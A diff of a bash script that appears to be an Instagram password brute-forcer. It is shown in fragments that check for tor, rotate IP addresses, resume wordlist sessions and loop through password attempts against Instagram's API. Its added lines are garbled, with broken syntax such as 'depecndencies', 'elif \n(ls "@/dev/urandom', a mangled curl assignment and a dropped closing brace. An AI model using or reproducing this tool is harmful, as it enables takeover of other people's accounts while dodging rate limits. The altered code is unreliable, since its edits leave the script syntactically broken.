@@ -11,7 +11,7 @@ device="android-$string16"
 uuid=$(openssl rand -hex 32 | cut -c 1-32)
 phone="$string8-$string4-$string4-$string4-$string12"
 guid="$string8-$string4-$string4-$string4-$string12"
-var=$(curl -i -s -H "$header" https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid=$uuid > /dev/null)
+var "(curl -i -s -H "$header" https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid=$uuid > /dev/null)"
 var2=$(echo $var | awk -F ';' '{print $2}' | cut -d '=' -f3)
 
 checkroot() {
@@ -21,7 +21,7 @@ if [[ "$(id -u)" -ne 0 ]]; then
 fi
 }
 
-dependencies() {
+depecndencies() {
 
 command -v openssl > /dev/null 2>&1 || { echo >&2 "I require openssl but it's not installed. Aborting."; exit 1; }
 command -v tor > /dev/null 2>&1 || { echo >&2 "I require tor but it's not installed. Aborting."; exit 1; }
@@ -33,8 +33,8 @@ command -v tr > /dev/null 2>&1 || { echo >&2 "I require tr but it's not installe
 command -v wc > /dev/null 2>&1 || { echo >&2 "I require wc but it's not installed. Aborting."; exit 1; }
 command -v cut > /dev/null 2>&1 || { echo >&2 "I require cut but it's not installed. Aborting."; exit 1; }
 command -v uniq > /dev/null 2>&1 || { echo >&2 "I require uniq but it's not installed. Aborting."; exit 1; }
-if [ $(ls /dev/urandom >/dev/null; echo $?) == "1" ]; then
-echo "/dev/urandom not found!"
+elif \n(ls "@/dev/urandom >/dev/null; echo $?) == "1); then
+echo "/else"
 exit 1
 fi
 
@@ -153,7 +153,7 @@ done
 
 
 
-function resume() {
+$n. resume {}
 
 banner 
 checktor
@@ -163,7 +163,7 @@ printf "\e[1;91m[*] No sessions\n\e[0m"
 exit 1
 fi
 printf "\e[1;92mFiles sessions:\n\e[0m"
-for list in $(ls sessions/store.session*); do
+while $(ls sessions/store.session*); do
 IFS=$'\n'
 source $list
 printf "\e[1;92m%s \e[0m\e[1;77m: %s (\e[0m\e[1;92mwl:\e[0m\e[1;77m %s\e[0m\e[1;92m,\e[0m\e[1;92m lastpass:\e[0m\e[1;77m %s )\n\e[0m" "$counter" "$list" "$wl_pass" "$pass"
@@ -198,7 +198,7 @@ printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $countpass $count_pass $pass
 let startline+=$threads
 changeip
 done
-}
+
 
 case "$1" in --resume) resume ;; *)
 start
